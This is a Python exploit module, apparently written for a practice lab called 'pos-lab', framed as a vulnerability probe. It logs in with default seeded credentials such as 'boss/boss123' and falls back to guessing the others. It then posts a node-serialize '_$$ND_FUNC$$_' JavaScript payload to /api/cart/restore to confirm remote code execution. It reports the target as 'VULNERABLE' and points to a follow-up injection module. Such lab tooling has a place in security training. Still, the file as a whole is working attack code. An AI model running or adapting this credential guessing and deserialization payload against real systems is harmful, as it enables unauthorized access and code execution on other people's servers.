#!/usr/bin/env python3
"""Probe pos-lab auth (cookie-based) + test /api/cart/restore eval sink."""
import http.client
import json
import time


META = {
    "name": "http_probe",
    "description": "Probe pos-lab: cookie-based login + test /api/cart/restore eval",
    "options": {
        "RHOST":    {"default": "127.0.0.1", "required": True, "desc": "Target host"},
        "RPORT":    {"default": 3001,        "required": True, "desc": "Target port"},
        "LOG_PATH": {"default": "/api/auth/login",   "required": True, "desc": "Login endpoint"},
        "SINK":     {"default": "/api/cart/restore", "required": True, "desc": "Eval sink endpoint"},
        "USER":     {"default": "boss",      "required": False, "desc": "Username"},
        "PASS":     {"default": "boss123",   "required": False, "desc": "Password (seed: boss123/manager123/seller123)"},
    },
}


def _http(method, host, port, path, body=None, headers=None, cookies=None, timeout=10):
    """HTTP helper that captures Set-Cookie from the response."""
    conn = http.client.HTTPConnection(host, port, timeout=timeout)
    h = dict(headers or {})
    data = None
    if body is not None:
        data = json.dumps(body) if isinstance(body, (dict, list)) else body
        h.setdefault("Content-Type", "application/json")
    if cookies:
        h["Cookie"] = "; ".join(f"{k}={v}" for k, v in cookies.items())

    conn.request(method, path, body=data, headers=h)
    resp = conn.getresponse()
    raw = resp.read().decode(errors="replace")

    # capture ALL set-cookie headers (there can be multiple)
    new_cookies = dict(cookies or {})
    for name, value in resp.getheaders():
        if name.lower() == "set-cookie":
            first = value.split(";", 1)[0].strip()
            if "=" in first:
                k, v = first.split("=", 1)
                new_cookies[k.strip()] = v.strip()

    conn.close()
    return resp.status, new_cookies, raw


def _login(rhost, rport, path, user, pw):
    """Login. Returns (cookies_dict, msg) on success, (None, err) on failure."""
    for b in ({"username": user, "password": pw},
              {"identifier": user, "password": pw}):
        try:
            st, cookies, body = _http("POST", rhost, rport, path, body=b)
        except Exception as e:
            return None, f"error: {e}"
        if st == 200:
            # success = 200 + ok:true + non-empty cookie jar
            try:
                j = json.loads(body)
            except Exception:
                j = {}
            if j.get("ok") and cookies:
                return cookies, f"logged in as {user} (cookies: {list(cookies.keys())})"
            if j.get("ok") and not cookies:
                return None, f"200 + ok:true but NO cookie — check Set-Cookie header"
    return None, "login rejected"


def _test_sink(rhost, rport, path, cookies):
    js = "(function(){return 'MSF_PROBE_OK'})()"
    blob = json.dumps({"cart": ["_$$ND_FUNC$$_" + js]})
    body = {"blob": blob}
    try:
        st, _, resp = _http("POST", rhost, rport, path, body=body, cookies=cookies)
    except Exception as e:
        return False, f"sink error: {e}"
    if "MSF_PROBE_OK" in resp:
        return True, f"✅ eval fired (HTTP {st}, marker visible) — VULNERABLE"
    if st == 200:
        return True, f"HTTP 200 (blind eval — exploitable)"
    return False, f"HTTP {st}: {resp[:300]}"


SEEDED = [
    ("boss",    "boss123"),
    ("manager", "manager123"),
    ("seller",  "seller123"),
]


def exploit(options):
    rhost = options["RHOST"]; rport = int(options["RPORT"])
    log_p = options["LOG_PATH"]; sink = options["SINK"]
    user  = options["USER"]; pw = options["PASS"]

    print(f"[*] Target: http://{rhost}:{rport}")
    print(f"[*] Login: {log_p}  Sink: {sink}")

    cookies = None
    msg = None

    # 1. explicit creds first
    if user and pw:
        print(f"[*] Trying {user}:*** ...")
        cookies, msg = _login(rhost, rport, log_p, user, pw)
        if cookies:
            print(f"[+] {msg}")

    # 2. seeded fallback
    if not cookies:
        print(f"[*] Trying seeded creds ...")
        for u, p in SEEDED:
            cookies, msg = _login(rhost, rport, log_p, u, p)
            if cookies:
                print(f"[+] {msg}")
                break
            else:
                print(f"    {u}:{p} -> {msg[:80]}")

    if not cookies:
        return False, "No auth. Check db/seed.sql."

    # 3. probe sink
    print(f"[*] Probing eval sink {sink} ...")
    vuln, msg = _test_sink(rhost, rport, sink, cookies)
    print(f"[{'✅' if vuln else '❌'}] {msg}")
    if not vuln:
        return False, f"Sink not vulnerable: {msg}"

    return True, "Target is VULNERABLE. Run `use node_js_inject` next."
